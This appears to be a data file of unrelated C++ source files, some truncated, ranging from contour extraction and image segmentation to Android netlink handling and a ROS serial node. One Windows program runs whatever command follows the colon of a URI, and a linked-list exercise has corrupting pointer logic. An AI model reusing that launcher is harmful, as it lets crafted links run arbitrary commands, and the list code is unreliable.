    "#include \"Square.h\"\n\nSquare::Square() : ambiguous(false) {}\n\nSquare::~Square() = default;\n\nvoid Square::init_square(\n    std::array<std::array<double, SQUARE_DIM>, SQUARE_DIM>& sq,\n    std::array<int, DIM - SQUARE_DIM>& c_i,\n    std::array<double, DIM - SQUARE_DIM>& c_v, std::array<double, DIM>& dex) {\n  points = sq;\n  const_i = c_i;\n  const_value = c_v;\n  dx = dex;\n  x1 = x2 = -1;\n  for (int i = 0; i < DIM; i++) {\n    if (i != const_i[0] && i != const_i[1]) {\n      (x1 < 0 ? x1 : x2) = i;\n    }\n  }\n  number_cuts = number_lines = 0;\n  ambiguous = false;\n}\n\nvoid Square::construct_lines(double value) {\n  // Check the corner points to see if there are lines\n  int above = 0;\n  for (int i = 0; i < DIM - SQUARE_DIM; i++) {\n    for (int j = 0; j < DIM - SQUARE_DIM; j++) {\n      if (points[i][j] >= value)\n        above++;\n    }\n  }\n  // If all corners are above or below this value, there are no lines in this\n  // square\n  if (above == 0 || above == 4) {\n    number_lines = 0;\n    return;\n  }\n  // Find the cut points and the points which are always outside of the\n  // surface. Also find_outside() arranges cuts so that first two cuts form\n  // a line as defined in the algorithm (in case there are 4 cuts)\n  ends_of_edge(value);\n  if (number_cuts > 0) {\n    find_outside(value);\n  }\n  // Then we go through the cut points and form the line elements\n  bool toggle = false;\n  for (int i = 0; i < number_cuts; i++) {\n    const int toggle_index = toggle ? 1 : 0;\n\n    points_temp[toggle_index][x1] = cuts[i][0];\n    points_temp[toggle_index][x2] = cuts[i][1];\n\n    const int c0 = const_i[0];\n    const int c1 = const_i[1];\n    points_temp[toggle_index][c0] = const_value[0];\n    points_temp[toggle_index][c1] = const_value[1];\n    // If we inserted both endpoints we insert the outside point\n    // and we are ready to create the line element\n    if (toggle) {\n      out_temp[x1] = out[i / 2][0];\n      out_temp[x2] = out[i / 2][1];\n      out_temp[c0] = const_value[0];\n      out_temp[c1] = const_value[1];\n      lines[number_lines++].init_line(points_temp, out_temp, const_i);\n    }\n    toggle = !toggle;  // Toggle between 0 and 1\n  }\n}\n\nvoid Square::ends_of_edge(double value) {\n  const double top_left = points[0][0] - value;\n  const double top_right = points[0][1] - value;\n  const double bottom_left = points[1][0] - value;\n  const double bottom_right = points[1][1] - value;\n  // Edge 1\n  if (top_left * bottom_left < 0) {\n    add_cut(std::array<double, SQUARE_DIM>{\n        top_left / (points[0][0] - points[1][0]) * dx[x1], 0});\n  } else if (points[0][0] == value && points[1][0] < value) {\n    add_cut(std::array<double, SQUARE_DIM>{ALMOST_ZERO * dx[x1], 0});\n  } else if (points[1][0] == value && points[0][0] < value) {\n    add_cut(std::array<double, SQUARE_DIM>{ALMOST_ONE * dx[x1], 0});\n  }\n\n  // Edge 2\n  if (top_left * top_right < 0) {\n    add_cut(std::array<double, SQUARE_DIM>{\n        0, top_left / (points[0][0] - points[0][1]) * dx[x2]});\n  } else if (points[0][0] == value && points[0][1] < value) {\n    add_cut(std::array<double, SQUARE_DIM>{0, ALMOST_ZERO * dx[x2]});\n  } else if (points[0][1] == value && points[0][0] < value) {\n    add_cut(std::array<double, SQUARE_DIM>{0, ALMOST_ONE * dx[x2]});\n  }\n\n  // Edge 3\n  if (bottom_left * bottom_right < 0) {\n    add_cut(std::array<double, SQUARE_DIM>{\n        dx[x1], bottom_left / (points[1][0] - points[1][1]) * dx[x2]});\n  } else if (points[1][0] == value && points[1][1] < value) {\n    add_cut(std::array<double, SQUARE_DIM>{dx[x1], ALMOST_ZERO * dx[x2]});\n  } else if (points[1][1] == value && points[1][0] < value) {\n    add_cut(std::array<double, SQUARE_DIM>{dx[x1], ALMOST_ONE * dx[x2]});\n  }\n\n  // Edge 4\n  if (top_right * bottom_right < 0) {\n    add_cut(std::array<double, SQUARE_DIM>{\n        top_right / (points[0][1] - points[1][1]) * dx[x1], dx[x2]});\n  } else if (points[0][1] == value && points[1][1] < value) {\n    add_cut(std::array<double, SQUARE_DIM>{ALMOST_ZERO * dx[x1], dx[x2]});\n  } else if (points[1][1] == value && points[0][1] < value) {\n    add_cut(std::array<double, SQUARE_DIM>{ALMOST_ONE * dx[x1], dx[x2]});\n  }\n\n  if (number_cuts != 0 && number_cuts != 2 && number_cuts != 4) {\n    std::cerr << \"Error in ends_of_edge: number_cuts \" << number_cuts\n              << std::endl;\n    exit(1);\n  }\n}\n\nvoid Square::find_outside(double value) {\n  if (number_cuts == 4) {\n    // If there are 4 cuts, the surface is ambiguous\n    ambiguous = true;\n\n    // Compute the value in the middle of the square\n    double value_middle = 0.0;\n    for (const auto& row : points) {\n      for (double point : row) {\n        value_middle += point;\n      }\n    }\n    value_middle *= 0.25;\n    // The default is that cuts are connected as \\\\ here.\n    // If both value_middle and (0,0) are above or below the criterion\n    // the cuts should be like // and we have to switch order in cuts\n    // Determine if cuts need to be swapped\n    if ((points[0][0] < value && value_middle < value) ||\n        (points[0][0] > val",
    "#include \"segment.h\"\n#include \"config.h\"\n\nusing namespace std;\n\n// Constructor\nSegment::Segment(string encoderPath, string decoderPath)\n{\n    mImageEncoder = new TRTModule(encoderPath,\n        { \"image\" },\n        { \"image_embeddings\" }, false, true);\n\n    mMaskDecoder = new TRTModule(decoderPath,\n        { \"image_embeddings\", \"point_coords\", \"point_labels\", \"mask_input\", \"has_mask_input\" },\n        { \"iou_predictions\", \"low_res_masks\" }, true, false);\n\n    mFeatures = new float[HIDDEN_DIM * FEATURE_WIDTH * FEATURE_HEIGHT];\n    mMaskInput = new float[HIDDEN_DIM * HIDDEN_DIM];\n    mHasMaskInput = new float;\n    mIouPrediction = new float[NUM_LABELS];\n    mLowResMasks = new float[NUM_LABELS * HIDDEN_DIM * HIDDEN_DIM];\n}\n\n// Deconstructor\nSegment::~Segment()\n{\n    if (mFeatures)      delete[] mFeatures;\n    if (mMaskInput)     delete[] mMaskInput;\n    if (mIouPrediction) delete[] mIouPrediction;\n    if (mLowResMasks)   delete[] mLowResMasks;\n\n    if (mImageEncoder)  delete mImageEncoder;\n    if (mMaskDecoder)   delete mMaskDecoder;\n}\n\n// Perform inference using Segment models\nMat Segment::predict(Mat& image, vector<Point> points, vector<float> labels)\n{\n    if (points.size() == 0) return cv::Mat(image.rows, image.cols, CV_32FC1);\n\n    // Preprocess encoder input\n    auto resizedImage = resizeImage(image, MODEL_INPUT_WIDTH, MODEL_INPUT_HEIGHT);\n\n    // Encoder Inference\n    mImageEncoder->setInput(resizedImage);\n    mImageEncoder->infer();\n    mImageEncoder->getOutput(mFeatures);\n\n    // Preprocess decoder input\n    auto pointData = new float[2 * points.size()];\n    prepareDecoderInput(points, pointData, points.size(), image.cols, image.rows);\n\n    // Decoder Inference\n    mMaskDecoder->setInput(mFeatures, pointData, labels.data(), mMaskInput, mHasMaskInput, points.size());\n    mMaskDecoder->infer();\n    mMaskDecoder->getOutput(mIouPrediction, mLowResMasks);\n\n    // Postprocessing\n    Mat imgMask(HIDDEN_DIM, HIDDEN_DIM, CV_32FC1, mLowResMasks);\n    upscaleMask(imgMask, image.cols, image.rows);\n\n    delete[] pointData;\n\n    return imgMask;\n}\n\nvoid Segment::prepareDecoderInput(vector<Point>& points, float* pointData, int numPoints, int imageWidth, int imageHeight)\n{\n    float scale = MODEL_INPUT_WIDTH / max(imageWidth, imageHeight);\n\n    for (int i = 0; i < numPoints; i++)\n    {\n        pointData[i * 2] = (float)points[i].x * scale;\n        pointData[i * 2 + 1] = (float)points[i].y * scale;\n    }\n\n    for (int i = 0; i < HIDDEN_DIM * HIDDEN_DIM; i++)\n    {\n        mMaskInput[i] = 0;\n    }\n    *mHasMaskInput = 0;\n}\n\nMat Segment::resizeImage(Mat& img, int inputWidth, int inputHeight)\n{\n    int w, h;\n    float aspectRatio = (float)img.cols / (float)img.rows;\n\n    if (aspectRatio >= 1)\n    {\n        w = inputWidth;\n        h = int(inputHeight / aspectRatio);\n    }\n    else\n    {\n        w = int(inputWidth * aspectRatio);\n        h = inputHeight;\n    }\n\n    Mat re(h, w, CV_8UC3);\n    cv::resize(img, re, re.size(), 0, 0, INTER_LINEAR);\n    Mat out(inputHeight, inputWidth, CV_8UC3, 0.0);\n    re.copyTo(out(Rect(0, 0, re.cols, re.rows)));\n\n    return out;\n}\n\nvoid Segment::upscaleMask(Mat& mask, int targetWidth, int targetHeight, int size)\n{\n    int limX, limY;\n    if (targetWidth > targetHeight)\n    {\n        limX = size;\n        limY = size * targetHeight / targetWidth;\n    }\n    else\n    {\n        limX = size * targetWidth / targetHeight;\n        limY = size;\n    }\n\n    cv::resize(mask(Rect(0, 0, limX, limY)), mask, Size(targetWidth, targetHeight));\n}\n",
    "#define _CRT_SECURE_NO_WARNINGS // wcstombs is \"unsafe\" lol\n#include <Windows.h>\n\n// Allocations\nvoid* __cdecl operator new[](size_t size) { return HeapAlloc(GetProcessHeap(), 0, size); }\nvoid __cdecl operator delete[](void* ptr) noexcept { HeapFree(GetProcessHeap(), 0, ptr); }\n\nsize_t __cdecl wcstombs(\n     _Out_writes_opt_(_MaxCount) char* _Dest,\n     _In_z_ wchar_t const* _Source,\n     _In_ size_t _MaxCount\n)\n{\n     int i = 0;\n     while (i < _MaxCount - 1 && _Source[i] != L'\\0')\n     {\n          _Dest[i] = static_cast <char>(_Source[i]);\n          i++;\n     }\n     _Dest[i] = '\\0';\n     return i;\n}\n\nextern \"C\" void mainCRTStartup(void)\n{\n     int main(int argc, char* argv[]);\n\n     int argc;\n     wchar_t** argvW = CommandLineToArgvW(GetCommandLineW(), &argc);\n\n     char** argv = new char*[argc];\n     for (int i = 0; i < argc; ++i)\n     {\n          const size_t len = lstrlenW(argvW[i]) + 1;\n          argv[i] = new char[len];\n          wcstombs(argv[i], argvW[i], len);\n     }\n\n     const int result = main(argc, argv);\n\n     LocalFree(argv);\n\n     ExitProcess(result);\n}\n\nint main(const int argc, char* argv[])\n{\n     if (argc != 2) return -1;\n\n     char* arg = argv[1];\n\n     char* colonPos = arg;\n     while (*colonPos && *colonPos != ':')\n          ++colonPos;\n\n     if (!*colonPos) return -1;\n\n     char* uri = colonPos + 1;\n\n     for (char* end = uri + lstrlenA(uri) - 1; end >= uri && *end == '/'; --end) *end = '\\0';\n\n     while (*uri == '/') uri++;\n\n     STARTUPINFO si{};\n     PROCESS_INFORMATION pi{};\n     si.cb = sizeof(si);\n     const BOOL success = CreateProcessA(\n          nullptr, uri, nullptr, nullptr, FALSE,\n          NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,\n          nullptr, nullptr, &si, &pi\n     );\n\n     if (!success) return static_cast <int>(GetLastError());\n\n     WaitForSingleObject(pi.hProcess, INFINITE); // wait for process.\n\n\n     DWORD code{};\n     GetExitCodeProcess(pi.hProcess, &code);\n\n     CloseHandle(pi.hProcess);\n     CloseHandle(pi.hThread);\n\n     return static_cast <int>(code);\n}\n",
    "\ufeff#include<iostream>\nusing namespace std;\n\n#define tab \"\\t\"\n\nclass Element\n{\nprivate:\n\tint Data;\n\tElement* pNext;\n\tElement* pPrev;\n\tstatic int count;\npublic:\n\tElement(int Data, Element* pPrev = nullptr, Element* pNext = nullptr) :Data(Data), pPrev(pPrev), pNext(pNext)\n\t{\n\t\tcount++;\n\t\tcout << \"EConstructor:\\t\\t\" << this << endl;\n\t}\n\t~Element()\n\t{\n\t\tcount--;\n\t\tcout << \"EDestructor:\\t\\t\" << this << endl;\n\t}\n\tfriend class List;\n\tfriend class Iterator;\n};\nint Element::count = 0;\n\n\tclass Iterator\n\t{\n\t\tElement* Temp;\n\tpublic:\n\t\tIterator(Element* Temp = nullptr) :Temp(Temp)\n\t\t{\n\t\t\tcout << \"ItConstructor:\\t\" << this << endl;\n\t\t}\n\t\t~Iterator()\n\t\t{\n\t\t\tcout << \"ItDestructor:\\t\" << this << endl;\n\t\t}\n\t\tIterator& operator++()\n\t\t{\n\t\t\tTemp = Temp->pPrev = Temp->pNext;\n\t\t\treturn *this;\n\t\t}\n\t};\nclass List\n{\n\tElement* Head;\n\tElement* Tail;\n\tunsigned int size;\npublic:\n\n\tIterator begin()\n\t{\n\t\treturn Head;\n\t}\n\tIterator end()\n\t{\n\t\treturn Tail;\n\t}\n\n\t//\t\t\t\t\tConstructors\n\tList()\n\t{\n\t\tHead = nullptr;\n\t\tTail = nullptr;\n\t\tsize = 0;\n\t\tcout << \"LConstructor:\\t\\t\" << this << endl;\n\t}\n\tList(const List& other) :List()\n\t{\n\t\t*this = other;\n\t\tcout << \"LCopyConstructor:\\t\" << this << endl;\n\t}\n\tList(List&& other)noexcept :List()\n\t{\n\t\t*this = std::move(other);\n\t\tcout << \"LMoveConstructor:\\t\" << this << endl;\n\t}\n\t~List()\n\t{\n\t\tcout << \"LDestructor:\\t\\t\" << this << endl;\n\t}\n\n\t//\t\t\t\t\tOperators:\n\tList& operator=(const List& other)\n\t{\n\t\tif (this == &other)return *this;\n\t\tfor (Element* Temp = other.Head; Temp; Temp = Temp->pPrev = Temp->pNext)\n\t\t\tcout << \"LCopyAssignment:\" << this << endl;\n\t\treturn *this;\n\t}\n\tList& operator=(List&& other)noexcept\n\t{\n\t\tif (this == &other)return *this;\n\t\tthis->Head = other.Head;\n\t\tthis->Tail = other.Tail;\n\t\tthis->size = other.size;\n\t\tother.Head = nullptr;\n\t\tother.Tail = nullptr;\n\t\tother.size = 0;\n\t\tcout << \"LMoveAssignment:\\t\" << this << endl;\n\t\treturn *this;\n\t}\n\n\t//\t\t\t\t\tMethods:\n\tvoid print()const\n\t{\n\t\tfor(Element* Temp = Head;Temp; Temp = Temp->pPrev = Temp->pNext)\n\t\t\tcout << Temp << tab << Temp->Data << tab << Temp->pPrev << tab << Temp->pNext << endl;\n\t\tcout << \"Head:\\t\\t\\t\" << Head << endl;\n\t\tcout << \"Tail:\\t\\t\\t\" << Tail << endl;\n\t\t//cout << \"Head:\\t\" << Head << tab << \"Tail:\\t\" << Tail << endl;\n\t}\n};\n\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n\tint n;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432:\"; cin >> n;\n\tList list;\n\tlist.print();\n\n\tList list2 = list;\n\tlist2.print();\n\n\tList list3 = std::move(list2);\n\tlist3.print();\n}",
    "#include \"managers/IOManager.hpp\"\n\n#include \"utils.hpp\"\n\n#include <SDL3/SDL.h>\n#include <assimp/IOStream.hpp>\n#include <assimp/IOSystem.hpp>\n#include <cstdint>\n#include <stdexcept>\n\nGameIOStream::GameIOStream(const char* pFile, const char* pMode) {\n\tmIO = SDL_IOFromFile(pFile, pMode);\n\n\tif (mIO == nullptr) {\n\t\tthrow std::runtime_error(\"Assimp IO Open failed\");\n\t}\n}\n\nGameIOStream::~GameIOStream() { SDL_CloseIO(mIO); }\n\nsize_t GameIOStream::Read(void* pvBuffer, size_t pSize, size_t pCount) {\n\tfor (size_t i = 0; i < pCount; ++i) {\n\t\tconst size_t status = SDL_ReadIO(mIO, static_cast<char*>(pvBuffer) + i * pSize, pSize);\n\n\t\tif (status == 0) {\n\t\t\t// SDL_Log(\"Read error: %s\", SDL_GetError());\n\n\t\t\treturn status;\n\t\t}\n\t}\n\n\treturn pCount;\n}\n\nsize_t GameIOStream::Write(const void* pvBuffer, size_t pSize, size_t pCount) {\n\tfor (size_t i = 0; i < pCount; ++i) {\n\t\tconst size_t status = SDL_WriteIO(mIO, static_cast<const char*>(pvBuffer) + i * pSize, pSize);\n\n\t\tif (status < pSize) {\n\t\t\tSDL_Log(\"Read write: %s\", SDL_GetError());\n\n\t\t\treturn status;\n\t\t}\n\t}\n\n\treturn pCount;\n}\n\naiReturn GameIOStream::Seek(size_t pOffset, aiOrigin pOrigin) {\n\tSDL_IOWhence whence;\n\n\tswitch (pOrigin) {\n\t\tcase aiOrigin_CUR:\n\t\t\twhence = SDL_IO_SEEK_CUR;\n\t\t\tbreak;\n\t\tcase aiOrigin_SET:\n\t\t\twhence = SDL_IO_SEEK_SET;\n\t\t\tbreak;\n\t\tcase aiOrigin_END:\n\t\t\twhence = SDL_IO_SEEK_END;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn aiReturn_FAILURE;\n\t}\n\n\tint64_t status = SDL_SeekIO(mIO, pOffset, whence);\n\n\t[[unlikely]] if (status == -1) {\n\t\treturn aiReturn_FAILURE;\n\t} else [[unlikely]] if (status < 0) {\n\t\tSDL_Log(\"Seek error %s\", SDL_GetError());\n\n\t\treturn aiReturn_OUTOFMEMORY;\n\t} else [[likely]] {\n\t\treturn aiReturn_SUCCESS;\n\t}\n}\n\nsize_t GameIOStream::Tell() const { return SDL_TellIO(mIO); }\n\nsize_t GameIOStream::FileSize() const { return SDL_GetIOSize(mIO); }\n\nvoid GameIOStream::Flush() { /* NOTE: SDL probably doesn't need flush */ }\n\nGameIOSystem::GameIOSystem() {}\n\nGameIOSystem::~GameIOSystem() {}\n\nbool GameIOSystem::Exists(const char* pFile) const {\n#ifndef ANDROID\n\tint stat = SDL_GetPathInfo(pFile, nullptr);\n\n\tif (stat == 0) {\n\t\treturn true;\n\t} else {\n\t\t// SDL_Log(\"File %s doesn't exist: %s\", pFile, SDL_GetError());\n\n\t\treturn false;\n\t}\n#else\n\t// TODO: Somehow make better\n\tSDL_IOStream* file = SDL_IOFromFile(pFile, \"r+b\");\n\tif (file == nullptr) {\n\t\t// SDL_Log(\"File %s doesn't exist: %s\", pFile, SDL_GetError());\n\n\t\treturn false;\n\t} else {\n\t\tSDL_CloseIO(file);\n\n\t\treturn true;\n\t}\n#endif\n}\n\nchar GameIOSystem::getOsSeparator() const { return SEPARATOR[0]; }\n\nAssimp::IOStream* GameIOSystem::Open(const char* pFile, const char* pMode) {\n\ttry {\n\t\treturn new GameIOStream(pFile, pMode);\n\t} catch (const std::runtime_error& e) {\n\t\t// SDL_Log(\"GameIO Error: %s: %s\", e.what(), SDL_GetError());\n\n\t\treturn nullptr;\n\t}\n}\n\nvoid GameIOSystem::Close(Assimp::IOStream* pFile) {\n\tGameIOStream* IO = dynamic_cast<GameIOStream*>(pFile);\n\n\tif (IO == nullptr) {\n\t\tthrow std::runtime_error(\"Assimp IO Close dynamic cast failed\");\n\t}\n\n\tdelete IO;\n}\n",
    "/*\n * Copyright (C) 2008 The Android Open Source Project\n * Copyright (C) 2019 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <errno.h>\n#include <stdio.h>\n#include <string.h>\n\n#include <sys/select.h>\n#include <sys/socket.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/un.h>\n\n#include <linux/netlink.h>\n\n#define LOG_TAG \"Vold\"\n\n#include <cutils/log.h>\n\n#include \"NetlinkHandler.h\"\n#include \"NetlinkManager.h\"\n\nNetlinkManager* NetlinkManager::sInstance = NULL;\n\nNetlinkManager* NetlinkManager::Instance() {\n    if (!sInstance) sInstance = new NetlinkManager();\n    return sInstance;\n}\n\nNetlinkManager::NetlinkManager() {\n    // Empty\n}\n\nNetlinkManager::~NetlinkManager() {}\n\nbool NetlinkManager::start() {\n    struct sockaddr_nl nladdr;\n    int sz = 64 * 1024;\n    int on = 1;\n\n    memset(&nladdr, 0, sizeof(nladdr));\n    nladdr.nl_family = AF_NETLINK;\n    nladdr.nl_pid = getpid();\n    nladdr.nl_groups = 0xffffffff;\n\n    if ((mSock = socket(PF_NETLINK, SOCK_DGRAM | SOCK_CLOEXEC, NETLINK_KOBJECT_UEVENT)) < 0) {\n        SLOGE(\"Unable to create uevent socket: %s\", strerror(errno));\n        return false;\n    }\n\n    // When running in a net/user namespace, SO_RCVBUFFORCE is not available.\n    // Try using SO_RCVBUF first.\n    if ((setsockopt(mSock, SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz)) < 0) &&\n        (setsockopt(mSock, SOL_SOCKET, SO_RCVBUFFORCE, &sz, sizeof(sz)) < 0)) {\n        SLOGE(\"Unable to set uevent socket SO_RCVBUF/SO_RCVBUFFORCE option: %s\", strerror(errno));\n        goto out;\n    }\n\n    if (setsockopt(mSock, SOL_SOCKET, SO_PASSCRED, &on, sizeof(on)) < 0) {\n        SLOGE(\"Unable to set uevent socket SO_PASSCRED option: %s\", strerror(errno));\n        goto out;\n    }\n\n    if (bind(mSock, (struct sockaddr*)&nladdr, sizeof(nladdr)) < 0) {\n        SLOGE(\"Unable to bind uevent socket: %s\", strerror(errno));\n        goto out;\n    }\n\n    mHandler = new NetlinkHandler(mSock);\n    if (!mHandler->start()) {\n        SLOGE(\"Unable to start NetlinkHandler: %s\", strerror(errno));\n        goto out;\n    }\n\n    return true;\n\nout:\n    close(mSock);\n    return false;\n}\n\nvoid NetlinkManager::stop() {\n    mHandler->stop();\n    delete mHandler;\n    mHandler = NULL;\n\n    close(mSock);\n    mSock = -1;\n}\n",
    "#include <Eigen/Eigen>\n#include <cmath>\n#include <iostream>\n#include <raycast.h>\n\nint signum(int x) {\n  return x == 0 ? 0 : x < 0 ? -1 : 1;\n}\n\ndouble mod(double value, double modulus) {\n  return fmod(fmod(value, modulus) + modulus, modulus);\n}\n\ndouble intbound(double s, double ds) {\n  // Find the smallest positive t such that s+t*ds is an integer.\n  if (ds < 0) {\n    return intbound(-s, -ds);\n  } else {\n    s = mod(s, 1);\n    // problem is now s+t*ds = 1\n    return (1 - s) / ds;\n  }\n}\n\nvoid Raycast(const Eigen::Vector3d& start, const Eigen::Vector3d& end, const Eigen::Vector3d& min,\n             const Eigen::Vector3d& max, int& output_points_cnt, Eigen::Vector3d* output) {\n  //    std::cout << start << ' ' << end << std::endl;\n  // From \"A Fast Voxel Traversal Algorithm for Ray Tracing\"\n  // by John Amanatides and Andrew Woo, 1987\n  // <http://www.cse.yorku.ca/~amana/research/grid.pdf>\n  // <http://citeseer.ist.psu.edu/viewdoc/summary?doi=10.1.1.42.3443>\n  // Extensions to the described algorithm:\n  //   \u2022 Imposed a distance limit.\n  //   \u2022 The face passed through to reach the current cube is provided to\n  //     the callback.\n\n  // The foundation of this algorithm is a parameterized representation of\n  // the provided ray,\n  //                    origin + t * direction,\n  // except that t is not actually stored; rather, at any given point in the\n  // traversal, we keep track of the *greater* t values which we would have\n  // if we took a step sufficient to cross a cube boundary along that axis\n  // (i.e. change the integer part of the coordinate) in the variables\n  // tMaxX, tMaxY, and tMaxZ.\n\n  // Cube containing origin point.\n  int x = (int)std::floor(start.x());\n  int y = (int)std::floor(start.y());\n  int z = (int)std::floor(start.z());\n  int endX = (int)std::floor(end.x());\n  int endY = (int)std::floor(end.y());\n  int endZ = (int)std::floor(end.z());\n  Eigen::Vector3d direction = (end - start);\n  double maxDist = direction.squaredNorm();\n\n  // Break out direction vector.\n  double dx = endX - x;\n  double dy = endY - y;\n  double dz = endZ - z;\n\n  // Direction to increment x,y,z when stepping.\n  int stepX = (int)signum((int)dx);\n  int stepY = (int)signum((int)dy);\n  int stepZ = (int)signum((int)dz);\n\n  // See description above. The initial values depend on the fractional\n  // part of the origin.\n  double tMaxX = intbound(start.x(), dx);\n  double tMaxY = intbound(start.y(), dy);\n  double tMaxZ = intbound(start.z(), dz);\n\n  // The change in t when taking a step (always positive).\n  double tDeltaX = ((double)stepX) / dx;\n  double tDeltaY = ((double)stepY) / dy;\n  double tDeltaZ = ((double)stepZ) / dz;\n\n  // Avoids an infinite loop.\n  if (stepX == 0 && stepY == 0 && stepZ == 0) return;\n\n  double dist = 0;\n  while (true) {\n    if (x >= min.x() && x < max.x() && y >= min.y() && y < max.y() && z >= min.z() && z < max.z()) {\n      output[output_points_cnt](0) = x;\n      output[output_points_cnt](1) = y;\n      output[output_points_cnt](2) = z;\n\n      output_points_cnt++;\n      dist = sqrt((x - start(0)) * (x - start(0)) + (y - start(1)) * (y - start(1)) +\n                  (z - start(2)) * (z - start(2)));\n\n      if (dist > maxDist) return;\n\n      /*            if (output_points_cnt > 1500) {\n                      std::cerr << \"Error, too many racyast voxels.\" <<\n         std::endl;\n                      throw std::out_of_range(\"Too many raycast voxels\");\n                  }*/\n    }\n\n    if (x == endX && y == endY && z == endZ) break;\n\n    // tMaxX stores the t-value at which we cross a cube boundary along the\n    // X axis, and similarly for Y and Z. Therefore, choosing the least tMax\n    // chooses the closest cube boundary. Only the first case of the four\n    // has been commented in detail.\n    if (tMaxX < tMaxY) {\n      if (tMaxX < tMaxZ) {\n        // Update which cube we are now in.\n        x += stepX;\n        // Adjust tMaxX to the next X-oriented boundary crossing.\n        tMaxX += tDeltaX;\n      } else {\n        z += stepZ;\n        tMaxZ += tDeltaZ;\n      }\n    } else {\n      if (tMaxY < tMaxZ) {\n        y += stepY;\n        tMaxY += tDeltaY;\n      } else {\n        z += stepZ;\n        tMaxZ += tDeltaZ;\n      }\n    }\n  }\n}\n\nvoid Raycast(const Eigen::Vector3d& start, const Eigen::Vector3d& end, const Eigen::Vector3d& min,\n             const Eigen::Vector3d& max, std::vector<Eigen::Vector3d>* output) {\n  //    std::cout << start << ' ' << end << std::endl;\n  // From \"A Fast Voxel Traversal Algorithm for Ray Tracing\"\n  // by John Amanatides and Andrew Woo, 1987\n  // <http://www.cse.yorku.ca/~amana/research/grid.pdf>\n  // <http://citeseer.ist.psu.edu/viewdoc/summary?doi=10.1.1.42.3443>\n  // Extensions to the described algorithm:\n  //   \u2022 Imposed a distance limit.\n  //   \u2022 The face passed through to reach the current cube is provided to\n  //     the callback.\n\n  // The foundation of this algorithm is a parameterized representation of\n  // the provided ray,\n  //                    origin + t * direction,\n  // exc",
    "#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/string.hpp\"\n#include \"geometry_msgs/msg/twist.hpp\"\n\n// C library headers\n#include <stdio.h>\n#include <string.h>\n#include <iostream>\n#include <random>\n\n// Linux headers\n#include <fcntl.h>   // Contains file controls like O_RDWR\n#include <errno.h>   // Error integer and strerror() function\n#include <termios.h> // Contains POSIX terminal control definitions\n#include <unistd.h>  // write(), read(), close()\n\nusing namespace std::chrono_literals;\nint serialPort;\n\nclass TeleopSTMNOde : public rclcpp::Node\n{\npublic:\n    int openSerialPort(const char *portname)\n    {\n        // Open the serial port. Change device path as needed (currently set to an standard FTDI USB-UART cable type device)\n        int serial_port = open(portname, O_RDWR);\n\n        if (serial_port < 0)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"Error opening  %s\\n\", portname);\n            // printf(\"Error opening  %s\\n\", portname, strerror(errno));\n            return -1;\n        }\n        else\n        {\n            RCLCPP_INFO(this->get_logger(), \"Serial port opened successfully.\");\n        }\n        return serial_port;\n    }\n    bool configureSerialPort(int serial_port, int baudrate)\n    {\n        // Create new termios struct, we call it 'tty' for convention\n        struct termios tty;\n        memset(&tty, 0, sizeof tty);\n\n        // Read in existing settings, and handle any error\n        if (tcgetattr(serial_port, &tty) != 0)\n        {\n            printf(\"Error %i from tcgetattr: %s\\n\", errno, strerror(errno));\n            RCLCPP_ERROR(this->get_logger(), \"Error from tcgetattr: %s\\n\", strerror(errno));\n\n            return false;\n        }\n\n        // Set in/out baud rate to be 9600\n        cfsetispeed(&tty, baudrate);\n        cfsetospeed(&tty, baudrate);\n\n        tty.c_cflag &= ~PARENB;        // Clear parity bit, disabling parity (most common)\n        tty.c_cflag &= ~CSTOPB;        // Clear stop field, only one stop bit used in communication (most common)\n        tty.c_cflag &= ~CSIZE;         // Clear all bits that set the data size\n        tty.c_cflag |= CS8;            // 8 bits per byte (most common)\n        tty.c_cflag &= ~CRTSCTS;       // Disable RTS/CTS hardware flow control (most common)\n        tty.c_cflag |= CREAD | CLOCAL; // Turn on READ & ignore ctrl lines (CLOCAL = 1)\n\n        tty.c_lflag &= ~ICANON;\n        tty.c_lflag &= ~ECHO;                                                        // Disable echo\n        tty.c_lflag &= ~ECHOE;                                                       // Disable erasure\n        tty.c_lflag &= ~ECHONL;                                                      // Disable new-line echo\n        tty.c_lflag &= ~ISIG;                                                        // Disable interpretation of INTR, QUIT and SUSP\n        tty.c_iflag &= ~(IXON | IXOFF | IXANY);                                      // Turn off s/w flow ctrl\n        tty.c_iflag &= ~(IGNBRK | BRKINT | PARMRK | ISTRIP | INLCR | IGNCR | ICRNL); // Disable any special handling of received bytes\n\n        tty.c_oflag &= ~OPOST; // Prevent special interpretation of output bytes (e.g. newline chars)\n        tty.c_oflag &= ~ONLCR; // Prevent conversion of newline to carriage return/line feed\n        // tty.c_oflag |= OCRNL;\n        //  tty.c_oflag &= ~OXTABS; // Prevent conversion of tabs to spaces (NOT PRESENT ON LINUX)\n        //  tty.c_oflag &= ~ONOEOT; // Prevent removal of C-d chars (0x004) in output (NOT PRESENT ON LINUX)\n        tty.c_cc[VTIME] = 10; // Wait for up to 1s (10 deciseconds), returning as soon as any data is received.\n        tty.c_cc[VMIN] = 0;   // read doesn't block\n\n        // Save tty settings, also checking for error\n        if (tcsetattr(serial_port, TCSANOW, &tty) != 0)\n        {\n            printf(\"Error %i from tcsetattr: %s\\n\", errno, strerror(errno));\n            RCLCPP_ERROR(this->get_logger(), \"Error from tcsetattr: %s\\n\", strerror(errno));\n            return false;\n        }\n        RCLCPP_INFO(this->get_logger(), \"Successfully configured board \");\n        return true;\n    }\n    void closeSerialPort(int serial_port)\n    {\n        RCLCPP_INFO(this->get_logger(), \"Closing Serial 